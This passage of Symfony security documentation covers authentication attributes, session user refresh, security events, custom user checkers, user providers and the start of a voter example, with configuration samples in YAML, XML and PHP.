You can use ``IS_AUTHENTICATED`` anywhere roles are used: like
``access_control`` or in Twig.

``IS_AUTHENTICATED`` isn't a role, but it kind of acts like one, and every
user that has logged in will have this. Actually, there are some special attributes
like this:

* ``IS_AUTHENTICATED_FULLY``: This is similar to ``IS_AUTHENTICATED_REMEMBERED``,
  but stronger. Users who are logged in only because of a "remember me cookie"
  will have ``IS_AUTHENTICATED_REMEMBERED`` but will not have ``IS_AUTHENTICATED_FULLY``.

* ``IS_REMEMBERED``: *Only* users authenticated using the
  :doc:`remember me functionality </security/remember_me>`, (i.e. a
  remember-me cookie).

* ``IS_IMPERSONATOR``: When the current user is
  :doc:`impersonating </security/impersonating_user>` another user in this
  session, this attribute will match.

.. _user_session_refresh:

Understanding how Users are Refreshed from the Session
------------------------------------------------------

At the end of every request (unless your firewall is ``stateless``), your
``User`` object is serialized to the session. At the beginning of the next
request, it's deserialized and then passed to your user provider to "refresh" it
(e.g. Doctrine queries for a fresh user).

Then, the two User objects (the original from the session and the refreshed User
object) are "compared" to see if they are "equal". By default, the core
``AbstractToken`` class compares the return values of the ``getPassword()``,
``getSalt()`` and ``getUserIdentifier()`` methods. If any of these are different,
your user will be logged out. This is a security measure to make sure that malicious
users can be de-authenticated if core user data changes.

However, in some cases, this process can cause unexpected authentication problems.
If you're having problems authenticating, it could be that you *are* authenticating
successfully, but you immediately lose authentication after the first redirect.

In that case, review the serialization logic (e.g. the ``__serialize()`` or
``serialize()`` methods) on your user class (if you have any) to make sure
that all the fields necessary are serialized and also exclude all the
fields not necessary to be serialized (e.g. Doctrine relations).

Comparing Users Manually with EquatableInterface
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Or, if you need more control over the "compare users" process, make your User class
implement :class:`Symfony\\Component\\Security\\Core\\User\\EquatableInterface`.
Then, your ``isEqualTo()`` method will be called when comparing users instead
of the core logic.

Security Events
---------------

During the authentication process, multiple events are dispatched that allow you
to hook into the process or customize the response sent back to the user. You
can do this by creating an :doc:`event listener or subscriber </event_dispatcher>`
for these events.

.. tip::

    Every Security firewall has its own event dispatcher
    (``security.event_dispatcher.FIREWALLNAME``). Events are dispatched on
    both the global and the firewall-specific dispatcher. You can register
    on the firewall dispatcher if you want your listener to only be
    called for a specific firewall. For instance, if you have an ``api``
    and ``main`` firewall, use this configuration to register only on the
    logout event in the ``main`` firewall:

    .. configuration-block::

        .. code-block:: yaml

            # config/services.yaml
            services:
                # ...

                App\EventListener\LogoutSubscriber:
                    tags:
                        - name: kernel.event_subscriber
                          dispatcher: security.event_dispatcher.main

        .. code-block:: xml

            <!-- config/services.xml -->
            <?xml version="1.0" encoding="UTF-8" ?>
            <container xmlns="http://symfony.com/schema/dic/services"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="http://symfony.com/schema/dic/services
                    https://symfony.com/schema/dic/services/services-1.0.xsd">

                <services>
                    <!-- ... -->

                    <service id="App\EventListener\LogoutSubscriber">
                        <tag name="kernel.event_subscriber"
                             dispatcher="security.event_dispatcher.main"
                         />
                    </service>
                </services>
            </container>

        .. code-block:: php

            // config/services.php
            namespace Symfony\Component\DependencyInjection\Loader\Configurator;

            use App\EventListener\LogoutSubscriber;

            return function(ContainerConfigurator $container): void {
                $services = $container->services();

                $services->set(LogoutSubscriber::class)
                    ->tag('kernel.event_subscriber', [
                        'dispatcher' => 'security.event_dispatcher.main',
                    ]);
            };

Authentication Events
~~~~~~~~~~~~~~~~~~~~~

.. raw:: html

    <object data="_images/security/security_events.svg" type="image/svg+xml"
        alt="A flow diagram showing the authentication events that are described in this section in a request-response cycle."
    ></object>

:class:`Symfony\\Component\\Security\\Http\\Event\\CheckPassportEvent`
    Dispatched after the authenticator created the :ref:`security passport <security-passport>`.
    Listeners of this event do the actual authentication checks (like
    checking the passport, validating the CSRF token, etc.)

:class:`Symfony\\Component\\Security\\Http\\Event\\AuthenticationTokenCreatedEvent`
    Dispatched after the passport was validated and the authenticator
    created the security token (and user). This can be used in advanced use-cases
    where you need to modify the created token (e.g. for multi factor
    authentication).

:class:`Symfony\\Component\\Security\\Core\\Event\\AuthenticationSuccessEvent`
    Dispatched when authentication is nearing success. This is the last
    event that can make an authentication fail by throwing an
    ``AuthenticationException``.

:class:`Symfony\\Component\\Security\\Http\\Event\\LoginSuccessEvent`
    Dispatched after authentication was fully successful. Listeners to this
    event can modify the response sent back to the user.

:class:`Symfony\\Component\\Security\\Http\\Event\\LoginFailureEvent`
    Dispatched after an ``AuthenticationException`` was thrown during
    authentication. Listeners to this event can modify the error response
    sent back to the user.

Other Events
~~~~~~~~~~~~

:class:`Symfony\\Component\\Security\\Http\\Event\\InteractiveLoginEvent`
    Dispatched after authentication was fully successful only when the authenticator
    implements :class:`Symfony\\Component\\Security\\Http\\Authenticator\\InteractiveAuthenticatorInterface`,
    which indicates login requires explicit user action (e.g. a login form).
    Listeners to this event can modify the response sent back to the user.

:class:`Symfony\\Component\\Security\\Http\\Event\\LogoutEvent`
    Dispatched just before a user logs out of your application. See
    :ref:`security-logging-out`.

:class:`Symfony\\Component\\Security\\Http\\Event\\TokenDeauthenticatedEvent`
    Dispatched when a user is deauthenticated, for instance because the
    password was changed. See :ref:`user_session_refresh`.

:class:`Symfony\\Component\\Security\\Http\\Event\\SwitchUserEvent`
    Dispatched after impersonation is completed. See
    :doc:`/security/impersonating_user`.

Frequently Asked Questions
--------------------------

**Can I have Multiple Firewalls?**
    Yes! However, each firewall is like a separate security system: being authenticated
    in one firewall doesn't make you authenticated in another one. Each firewall can have
    multiple ways of allowing authentication (e.g. form login, and API key authentication).
    If you want to share authentication between firewalls, you have to explicitly
    specify the same :ref:`reference-security-firewall-context` for different firewalls.

**Security doesn't seem to work on my Error Pages**
    As routing is done *before* security, 404 error pages are not covered by
    any firewall. This means you can't check for security or even access the
    user object on these pages. See :doc:`/controller/error_pages`
    for more details.

**My Authentication Doesn't Seem to Work: No Errors, but I'm Never Logged In**
    Sometimes authentication may be successful, but after redirecting, you're
    logged out immediately due to a problem loading the ``User`` from the session.
    To see if this is an issue, check your log file (``var/log/dev.log``) for
    the log message.

**Cannot refresh token because user has changed**
    If you see this, there are two possible causes. First, there may be a problem
    loading your User from the session. See :ref:`user_session_refresh`. Second,
    if certain user information was changed in the database since the last page
    refresh, Symfony will purposely log out the user for security reasons.

Learn More
----------

Authentication (Identifying/Logging in the User)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. toctree::
    :maxdepth: 1

    security/passwords
    security/ldap
    security/remember_me
    security/impersonating_user
    security/user_checkers
    security/firewall_restriction
    security/csrf
    security/form_login
    security/custom_authenticator
    security/entry_point

Authorization (Denying Access)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. toctree::
    :maxdepth: 1

    security/voters
    security/access_control
    security/expressions
    security/access_denied_handler
    security/force_https

.. _`HWIOAuthBundle`: https://github.com/hwi/HWIOAuthBundle
.. _`OWASP Brute Force Attacks`: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
.. _`brute force login attacks`: https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks
.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
.. _`SymfonyCastsVerifyEmailBundle`: https://github.com/symfonycasts/verify-email-bundle
.. _`HTTP Basic authentication`: https://en.wikipedia.org/wiki/Basic_access_authentication
.. _`Login CSRF attacks`: https://en.wikipedia.org/wiki/Cross-site_request_forgery#Forging_login_requests
.. _`PHP date relative formats`: https://www.php.net/manual/en/datetime.formats.php#datetime.formats.relative
How to Create and Enable Custom User Checkers
=============================================

During the authentication of a user, additional checks might be required to verify
if the identified user is allowed to log in. By defining a custom user checker, you
can define per firewall which checker should be used.

Creating a Custom User Checker
------------------------------

User checkers are classes that must implement the
:class:`Symfony\\Component\\Security\\Core\\User\\UserCheckerInterface`. This interface
defines two methods called ``checkPreAuth()`` and ``checkPostAuth()`` to
perform checks before and after user authentication. If one or more conditions
are not met, throw an exception which extends the
:class:`Symfony\\Component\\Security\\Core\\Exception\\AccountStatusException` class.
Consider using :class:`Symfony\\Component\\Security\\Core\\Exception\\CustomUserMessageAccountStatusException`,
which extends ``AccountStatusException`` and allows to customize the error message
displayed to the user::

    namespace App\Security;

    use App\Entity\User as AppUser;
    use Symfony\Component\Security\Core\Exception\AccountExpiredException;
    use Symfony\Component\Security\Core\Exception\CustomUserMessageAccountStatusException;
    use Symfony\Component\Security\Core\User\UserCheckerInterface;
    use Symfony\Component\Security\Core\User\UserInterface;

    class UserChecker implements UserCheckerInterface
    {
        public function checkPreAuth(UserInterface $user): void
        {
            if (!$user instanceof AppUser) {
                return;
            }

            if ($user->isDeleted()) {
                // the message passed to this exception is meant to be displayed to the user
                throw new CustomUserMessageAccountStatusException('Your user account no longer exists.');
            }
        }

        public function checkPostAuth(UserInterface $user): void
        {
            if (!$user instanceof AppUser) {
                return;
            }

            // user account is expired, the user may be notified
            if ($user->isExpired()) {
                throw new AccountExpiredException('...');
            }
        }
    }

Enabling the Custom User Checker
--------------------------------

Next, make sure your user checker is registered as a service. If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
the service is registered automatically.

All that's left to do is add the checker to the desired firewall where the value
is the service id of your user checker:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml

        # ...
        security:
            firewalls:
                main:
                    pattern: ^/
                    user_checker: App\Security\UserChecker
                    # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="main"
                        pattern="^/"
                        user-checker="App\Security\UserChecker">
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\UserChecker;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('main')
                ->pattern('^/')
                ->userChecker(UserChecker::class)
                // ...
            ;
        };

Using Multiple User Checkers
----------------------------

It is common for applications to have multiple authentication entry points (such as
traditional form based login and an API) which may have unique checker rules for each
entry point as well as common rules for all entry points. To allow using multiple user
checkers on a firewall, a service for the :class:`Symfony\\Component\\Security\\Core\\User\\ChainUserChecker`
class is created for each firewall.

To use the chain user checker, first you will need to tag your user checker services with the
``security.user_checker.<firewall>`` tag (where ``<firewall>`` is the name of the firewall
in your security configuration). The service tag also supports the priority attribute, allowing you to define the
order in which user checkers are called::

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml

        # ...
        services:
            App\Security\AccountEnabledUserChecker:
                tags:
                    - { name: security.user_checker.api, priority: 10 }
                    - { name: security.user_checker.main, priority: 10 }

            App\Security\APIAccessAllowedUserChecker:
                tags:
                    - { name: security.user_checker.api, priority: 5 }

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="App\Security\AccountEnabledUserChecker">
                    <tag name="security.user_checker.api" priority="10"/>
                    <tag name="security.user_checker.main" priority="10"/>
                </service>

                <service id="App\Security\APIAccessAllowedUserChecker">
                    <tag name="security.user_checker.api" priority="5"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Security\AccountEnabledUserChecker;
        use App\Security\APIAccessAllowedUserChecker;

        return function(ContainerConfigurator $containerConfigurator) {
            $services = $containerConfigurator->services();

            $services->set(AccountEnabledUserChecker::class)
                ->tag('security.user_checker.api', ['priority' => 10])
                ->tag('security.user_checker.main', ['priority' => 10]);

            $services->set(APIAccessAllowedUserChecker::class)
                ->tag('security.user_checker.api', ['priority' => 5]);
        };

Once your checker services are tagged, next you will need configure your firewalls to use the
``security.user_checker.chain.<firewall>`` service::

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml

        # ...
        security:
            firewalls:
                api:
                    pattern: ^/api
                    user_checker: security.user_checker.chain.api
                    # ...
                main:
                    pattern: ^/
                    user_checker: security.user_checker.chain.main
                    # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->
                <firewall name="api"
                        pattern="^/api"
                        user-checker="security.user_checker.chain.api">
                    <!-- ... -->
                </firewall>
                <firewall name="main"
                        pattern="^/"
                        user-checker="security.user_checker.chain.main">
                    <!-- ... -->
                </firewall>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...
            $security->firewall('api')
                ->pattern('^/api')
                ->userChecker('security.user_checker.chain.api')
                // ...
            ;

            $security->firewall('main')
                ->pattern('^/')
                ->userChecker('security.user_checker.chain.main')
                // ...
            ;
        };
User Providers
==============

User providers (re)load users from a storage (e.g. a database) based on a
"user identifier" (e.g. the user's email address or username). See
:ref:`security-user-providers` for more detailed information when a user
provider is used.

Symfony provides several user providers:

:ref:`Entity User Provider <security-entity-user-provider>`
    Loads users from a database using :doc:`Doctrine </doctrine>`;
:ref:`LDAP User Provider <security-ldap-user-provider>`
    Loads users from a LDAP server;
:ref:`Memory User Provider <security-memory-user-provider>`
    Loads users from a configuration file;
:ref:`Chain User Provider <security-chain-user-provider>`
    Merges two or more user providers into a new user provider.

.. _security-entity-user-provider:

Entity User Provider
--------------------

This is the most common user provider. Users are stored in a database and
the user provider uses :doc:`Doctrine </doctrine>` to retrieve them.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            providers:
                users:
                    entity:
                        # the class of the entity that represents users
                        class: 'App\Entity\User'
                        # the property to query by - e.g. email, username, etc
                        property: 'email'

                        # optional: if you're using multiple Doctrine entity
                        # managers, this option defines which one to use
                        #manager_name: 'customer'

            # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <config>
                <provider name="users">
                    <!-- class:    the class of the entity that represents users
                         property: the property to query by - e.g. email, username, etc-->
                    <entity class="App\Entity\User" property="email"/>

                    <!-- optional, if you're using multiple Doctrine entity
                         managers, "manager-name" defines which one to use -->
                    <!-- <entity class="App\Entity\User" property="email"
                                 manager-name="customer"/> -->
                </provider>

                <!-- ... -->
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->provider('app_user_provider')
                ->entity()
                    ->class(User::class)
                    ->property('email')
            ;
        };

.. _authenticating-someone-with-a-custom-entity-provider:

Using a Custom Query to Load the User
.....................................

The entity provider can only query from one *specific* field, specified by
the ``property`` config key. If you want a bit more control over this - e.g. you
want to find a user by ``email`` *or* ``username``, you can do that by
implementing :class:`Symfony\\Bridge\\Doctrine\\Security\\User\\UserLoaderInterface`
in your :ref:`Doctrine repository <doctrine-queries>` (e.g. ``UserRepository``)::

    // src/Repository/UserRepository.php
    namespace App\Repository;

    use App\Entity\User;
    use Doctrine\Bundle\DoctrineBundle\Repository\ServiceEntityRepository;
    use Symfony\Bridge\Doctrine\Security\User\UserLoaderInterface;

    class UserRepository extends ServiceEntityRepository implements UserLoaderInterface
    {
        // ...

        public function loadUserByIdentifier(string $usernameOrEmail): ?User
        {
            $entityManager = $this->getEntityManager();

            return $entityManager->createQuery(
                    'SELECT u
                    FROM App\Entity\User u
                    WHERE u.username = :query
                    OR u.email = :query'
                )
                ->setParameter('query', $usernameOrEmail)
                ->getOneOrNullResult();
        }
    }

To finish this, remove the ``property`` key from the user provider in
``security.yaml``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            providers:
                users:
                    entity:
                        class: App\Entity\User

            # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:srv="http://symfony.com/schema/dic/services"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <provider name="users">
                    <entity class="App\Entity\User"/>
                </provider>

                <!-- ... -->
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $security->provider('app_user_provider')
                ->entity()
                    ->class(User::class)
            ;
        };

Now, whenever Symfony uses the user provider, the ``loadUserByIdentifier()``
method on your ``UserRepository`` will be called.

.. _security-memory-user-provider:

Memory User Provider
--------------------

It's not recommended to use this provider in real applications because of its
limitations and how difficult it is to manage users. It may be useful in application
prototypes and for limited applications that don't store users in databases.

This user provider stores all user information in a configuration file,
including their passwords. Make sure the passwords are hashed properly. See
:doc:`/security/passwords` for more information.

After setting up hashing, you can configure all the user information in
``security.yaml``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            providers:
                backend_users:
                    memory:
                        users:
                            john_admin: { password: '$2y$13$jxGxc ... IuqDju', roles: ['ROLE_ADMIN'] }
                            jane_admin: { password: '$2y$13$PFi1I ... rGwXCZ', roles: ['ROLE_ADMIN', 'ROLE_SUPER_ADMIN'] }

            # ...

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:srv="http://symfony.com/schema/dic/services"
                       xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <provider name="app_user_provider2">
                    <memory>
                        <user identifier="john_admin" password="$2y$13$jxGxc ... IuqDju" roles="ROLE_ADMIN"/>
                        <user identifier="jane_admin" password="$2y$13$PFi1I ... rGwXCZ" roles="ROLE_ADMIN, ROLE_SUPER_ADMIN"/>
                    </memory>
                </provider>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $memoryProvider = $security->provider('app_user_provider')->memory();
            $memoryProvider
                ->user('john_admin')
                    ->password('$2y$13$jxGxc ... IuqDju')
                    ->roles(['ROLE_ADMIN'])
            ;

            $memoryProvider
                ->user('jane_admin')
                ->password('$2y$13$PFi1I ... rGwXCZ')
                ->roles(['ROLE_ADMIN', 'ROLE_SUPER_ADMIN'])
            ;
        };

.. caution::

    When using a ``memory`` provider, and not the ``auto`` algorithm, you have
    to choose an encoding without salt (i.e. ``bcrypt``).

.. _security-chain-user-provider:

Chain User Provider
-------------------

This user provider combines two or more of the other providers
to create a new user provider. The order in which
providers are configured is important because Symfony will look for users
starting from the first provider and will keep looking for in the other
providers until the user is found:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            # ...
            providers:
                backend_users:
                    ldap:
                        # ...

                legacy_users:
                    entity:
                        # ...

                users:
                    entity:
                        # ...

                all_users:
                    chain:
                        providers: ['legacy_users', 'users', 'backend_users']

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:srv="http://symfony.com/schema/dic/services"
                       xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <provider name="backend_users">
                    <ldap service="..." base-dn="..."/>
                </provider>

                <provider name="legacy_users">
                    <entity>
                        <!-- ... -->
                    </entity>
                </provider>

                <provider name="users">
                    <entity>
                        <!-- ... -->
                    </entity>
                </provider>

                <provider name="all_users">
                    <chain>
                        <provider>backend_users</provider>
                        <provider>legacy_users</provider>
                        <provider>users</provider>
                    </chain>
                </provider>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Entity\User;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

            $backendProvider = $security->provider('backend_users')
                ->ldap()
                // ...
            ;

            $legacyProvider = $security->provider('legacy_users')
                ->entity()
                // ...
            ;

            $userProvider = $security->provider('users')
                ->entity()
                // ...
            ;

            $allProviders = $security->provider('all_users')->chain()
                ->providers([$backendProvider, $legacyProvider, $userProvider])
            ;
        };

.. _security-custom-user-provider:

Creating a Custom User Provider
-------------------------------

Most applications don't need to create a custom provider. If you store users in
a database, a LDAP server or a configuration file, Symfony supports that.
However, if you're loading users from a custom location (e.g. via an API or
legacy database connection), you'll need to create a custom user provider.

First, make sure you've followed the :doc:`Security Guide </security>` to create
your ``User`` class.

If you used the ``make:user`` command to create your ``User`` class (and you
answered the questions indicating that you need a custom user provider), that
command will generate a nice skeleton to get you started::

    // src/Security/UserProvider.php
    namespace App\Security;

    use Symfony\Component\Security\Core\Exception\UnsupportedUserException;
    use Symfony\Component\Security\Core\Exception\UserNotFoundException;
    use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
    use Symfony\Component\Security\Core\User\PasswordUpgraderInterface;
    use Symfony\Component\Security\Core\User\UserInterface;
    use Symfony\Component\Security\Core\User\UserProviderInterface;

    class UserProvider implements UserProviderInterface, PasswordUpgraderInterface
    {
        /**
         * Symfony calls this method if you use features like switch_user
         * or remember_me. If you're not using these features, you do not
         * need to implement this method.
         *
         * @throws UserNotFoundException if the user is not found
         */
        public function loadUserByIdentifier(string $identifier): UserInterface
        {
            // Load a User object from your data source or throw UserNotFoundException.
            // The $identifier argument is whatever value is being returned by the
            // getUserIdentifier() method in your User class.
            throw new \Exception('TODO: fill in loadUserByIdentifier() inside '.__FILE__);
        }

        /**
         * Refreshes the user after being reloaded from the session.
         *
         * When a user is logged in, at the beginning of each request, the
         * User object is loaded from the session and then this method is
         * called. Your job is to make sure the user's data is still fresh by,
         * for example, re-querying for fresh User data.
         *
         * If your firewall is "stateless: true" (for a pure API), this
         * method is not called.
         */
        public function refreshUser(UserInterface $user): UserInterface
        {
            if (!$user instanceof User) {
                throw new UnsupportedUserException(sprintf('Invalid user class "%s".', get_class($user)));
            }

            // Return a User object after making sure its data is "fresh".
            // Or throw a UserNotFoundException if the user no longer exists.
            throw new \Exception('TODO: fill in refreshUser() inside '.__FILE__);
        }

        /**
         * Tells Symfony to use this provider for this User class.
         */
        public function supportsClass(string $class): bool
        {
            return User::class === $class || is_subclass_of($class, User::class);
        }

        /**
         * Upgrades the hashed password of a user, typically for using a better hash algorithm.
         */
        public function upgradePassword(PasswordAuthenticatedUserInterface $user, string $newHashedPassword): void
        {
            // TODO: when hashed passwords are in use, this method should:
            // 1. persist the new password in the user storage
            // 2. update the $user object with $user->setPassword($newHashedPassword);
        }
    }

Most of the work is already done! Read the comments in the code and update the
TODO sections to finish the user provider. When you're done, tell Symfony about
the user provider by adding it in ``security.yaml``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/security.yaml
        security:
            providers:
                # the name of your user provider can be anything
                your_custom_user_provider:
                    id: App\Security\UserProvider

    .. code-block:: xml

        <!-- config/packages/security.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <srv:container xmlns="http://symfony.com/schema/dic/security"
                       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                       xmlns:srv="http://symfony.com/schema/dic/services"
                       xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/security
                https://symfony.com/schema/dic/security/security-1.0.xsd">

            <config>
                <!-- ... -->

                <provider name="your_custom_user_provider" id="App\Security\UserProvider">
                    <!-- ... -->
                </provider>
            </config>
        </srv:container>

    .. code-block:: php

        // config/packages/security.php
        use App\Security\UserProvider;
        use Symfony\Config\SecurityConfig;

        return static function (SecurityConfig $security): void {
            // ...

             $customProvider = $security->provider('your_custom_user_provider')
                ->id(UserProvider::class)
                // ...
            ;
        };

Lastly, update the ``config/packages/security.yaml`` file to set the
``provider`` key to ``your_custom_user_provider`` in all the firewalls which
will use this custom user provider.
.. _security/custom-voter:

How to Use Voters to Check User Permissions
===========================================

Voters are Symfony's most powerful way of managing permissions. They allow you
to centralize all permission logic, then reuse them in many places.

However, if you don't reuse permissions or your rules are basic, you can always
put that logic directly into your controller instead. Here's an example how
this could look like, if you want to make a route accessible to the "owner" only::

    // src/Controller/PostController.php
    // ...

    // inside your controller action
    if ($post->getOwner() !== $this->getUser()) {
        throw $this->createAccessDeniedException();
    }

In that sense, the following example used throughout this page is a minimal
example for voters.

Here's how Symfony works with voters: All voters are called each time you
use the ``isGranted()`` method on Symfony's authorization checker or call
``denyAccessUnlessGranted()`` in a controller (which uses the authorization
checker), or by :ref:`access controls <security-access-control-enforcement-options>`.

Ultimately, Symfony takes the responses from all voters and makes the final
decision (to allow or deny access to the resource) according to
:ref:`the strategy defined in the application <security-voters-change-strategy>`,
which can be: affirmative, consensus, unanimous or priority.

The Voter Interface
-------------------

A custom voter needs to implement
:class:`Symfony\\Component\\Security\\Core\\Authorization\\Voter\\VoterInterface`
or extend :class:`Symfony\\Component\\Security\\Core\\Authorization\\Voter\\Voter`,
which makes creating a voter even easier::

    use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
    use Symfony\Component\Security\Core\Authorization\Voter\VoterInterface;

    abstract class Voter implements VoterInterface
    {
        abstract protected function supports(string $attribute, mixed $subject): bool;
        abstract protected function voteOnAttribute(string $attribute, mixed $subject, TokenInterface $token): bool;
    }

.. _how-to-use-the-voter-in-a-controller:

.. tip::

    Checking each voter several times can be time consuming for applications
    that perform a lot of permission checks. To improve performance in those cases,
    you can make your voters implement the :class:`Symfony\\Component\\Security\\Core\\Authorization\\Voter\\CacheableVoterInterface`.
    This allows the access decision manager to remember the attribute and type
    of subject supported by the voter, to only call the needed voters each time.

Setup: Checking for Access in a Controller
------------------------------------------

Suppose you have a ``Post`` object and you need to decide whether or not the current
user can *edit* or *view* the object. In your controller, you'll check access with
code like this:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Controller/PostController.php

        // ...
        use Symfony\Component\Security\Http\Attribute\IsGranted;

        class PostController extends AbstractController
        {
            #[Route('/posts/{id}', name: 'post_show')]
            // check for "view" access: calls all voters
            #[IsGranted('view', 'post')]
            public function show(Post $post): Response
            {
                // ...
            }

            #[Route('/posts/{id}/edit', name: 'post_edit')]
            // check for "edit" access: calls all voters
            #[IsGranted('edit', 'post')]
            public function edit(Post $post): Response
            {
                // ...
            }
        }

    .. code-block:: php

        // src/Controller/PostController.php

        // ...
        use App\Security\PostVoter;

        class PostController extends AbstractController
        {
            #[Route('/posts/{id}', name: 'post_show')]
            public function show(Post $post): Response
            {
                // check for "view" access: calls all voters
                $this->denyAccessUnlessGranted(PostVoter::VIEW, $post);

                // ...
            }

            #[Route('/posts/{id}/edit', name: 'post_edit')]
            public function edit(Post $post): Response
            {
                // check for "edit" access: calls all voters
                $this->denyAccessUnlessGranted(PostVoter::EDIT, $post);

                // ...
            }
        }

The ``#[IsGranted()]`` attribute or ``denyAccessUnlessGranted()`` method (and also the ``isGranted()`` method)
calls out to the "voter" system. Right now, no voters will vote on whether or not
the user can "view" or "edit" a ``Post``. But you can create your *own* voter that
decides this using whatever logic you want.

Creating the custom Voter
-------------------------

Suppose the logic to decide if a user can "view" or "edit" a ``Post`` object is
pretty complex. For example, a ``User`` can always edit or view a ``Post`` they created.
And if a ``Post`` is marked as "public", anyone can view it. A voter for this situation
would look like this::

    // src/Security/PostVoter.php
    namespace App\Security;

    use App\Entity\Post;
    use App\Entity\User;
    use Symfony\Component\Security\Core\Authentication\Token\TokenInterface;
    use Symfony\Component\Security\Core\Authorization\Voter\Voter;

    class PostVoter extends Voter
    {
        // these strings are just invented: you can use anything
        const VIEW = 'view';
        const EDIT = 'edit';

        protected function supports(string $attribute, mixed $subject): bool
        {
            // if the attribute isn't one we support, return false
            if (!in_array($attribute, [self::VIEW, self::EDIT])) {
                return false;
            }

            // only vote on `Post` objects
            if (!$subject instanceof Post) {
                return false;
            }

            return true;
        }

